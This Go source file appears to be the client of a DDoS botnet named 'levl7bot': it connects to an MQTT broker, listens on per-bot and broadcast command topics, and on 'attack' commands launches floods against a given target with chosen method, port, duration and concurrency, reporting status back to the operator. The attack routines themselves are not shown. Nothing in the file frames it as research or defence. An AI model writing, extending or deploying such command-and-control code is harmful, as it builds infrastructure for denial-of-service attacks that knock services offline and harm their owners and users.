package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	mqtt "github.com/eclipse/paho.mqtt.golang"
)

var verbose bool

func logf(format string, v ...interface{}) {
	if verbose {
		log.Printf(format, v...)
	}
}

func main() {
	hostname, _ := os.Hostname()
	broker := flag.String("broker", "tcp://127.0.0.1:1883", "MQTT broker URL")
	username := flag.String("username", "levl7bot", "MQTT username")
	password := flag.String("password", "", "MQTT password")
	botID := flag.String("id", hostname, "Unique bot ID")
	flag.BoolVar(&verbose, "verbose", false, "Verbose logging")
	flag.Parse()

	if *password == "" {
		log.Fatal("--password is required")
	}

	manager := newAttackManager()

	opts := mqtt.NewClientOptions()
	opts.AddBroker(*broker)
	opts.SetUsername(*username)
	opts.SetPassword(*password)
	opts.SetClientID(fmt.Sprintf("levl7bot_%s", *botID))
	opts.SetCleanSession(true)
	opts.SetConnectionLostHandler(func(c mqtt.Client, err error) {
		log.Printf("MQTT connection lost: %v", err)
	})
	opts.SetOnConnectHandler(func(c mqtt.Client) {
		log.Printf("Connected to MQTT broker")
		topic1 := fmt.Sprintf("levl7/cmd/%s", *botID)
		topic2 := "levl7/cmd/all"
		token := c.Subscribe(topic1, 0, makeCmdHandler(manager, *botID))
		token.Wait()
		token = c.Subscribe(topic2, 0, makeCmdHandler(manager, *botID))
		token.Wait()
		logf("Subscribed to %s and %s", topic1, topic2)
	})

	client := mqtt.NewClient(opts)
	token := client.Connect()
	token.Wait()
	if token.Error() != nil {
		log.Fatalf("Failed to connect: %v", token.Error())
	}

	log.Printf("Bot %s ready. Waiting for commands...", *botID)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	log.Println("Shutting down...")
	manager.stopAll()
	client.Disconnect(250)
}

type Command struct {
	Action      string `json:"action"`
	AttackID    string `json:"attack_id"`
	Method      string `json:"method"`
	Target      string `json:"target"`
	Port        string `json:"port"`
	Time        int    `json:"time"`
	Concurrents int    `json:"concurrents"`
	Rpc         int    `json:"rpc"`
	Layer       string `json:"layer"`
}

func makeCmdHandler(manager *attackManager, botID string) mqtt.MessageHandler {
	return func(client mqtt.Client, msg mqtt.Message) {
		var cmd Command
		if err := json.Unmarshal(msg.Payload(), &cmd); err != nil {
			log.Printf("Invalid command JSON: %v", err)
			return
		}
		logf("Received command: %+v", cmd)

		switch cmd.Action {
		case "attack":
			if cmd.AttackID == "" || cmd.Target == "" || cmd.Method == "" {
				log.Printf("Invalid attack command: missing fields")
				return
			}
			if cmd.Concurrents < 1 {
				cmd.Concurrents = 1
			}
			if cmd.Time < 1 {
				cmd.Time = 30
			}
			manager.start(cmd)
			status := map[string]interface{}{
				"status":    "attacking",
				"attack_id": cmd.AttackID,
				"method":    cmd.Method,
				"target":    cmd.Target,
				"time":      cmd.Time,
			}
			payload, _ := json.Marshal(status)
			client.Publish(fmt.Sprintf("levl7/status/%s", botID), 0, false, payload)

		case "stop":
			manager.stop(cmd.AttackID)
			status := map[string]interface{}{
				"status":    "stopped",
				"attack_id": cmd.AttackID,
			}
			payload, _ := json.Marshal(status)
			client.Publish(fmt.Sprintf("levl7/status/%s", botID), 0, false, payload)

		default:
			log.Printf("Unknown action: %s", cmd.Action)
		}
	}
}
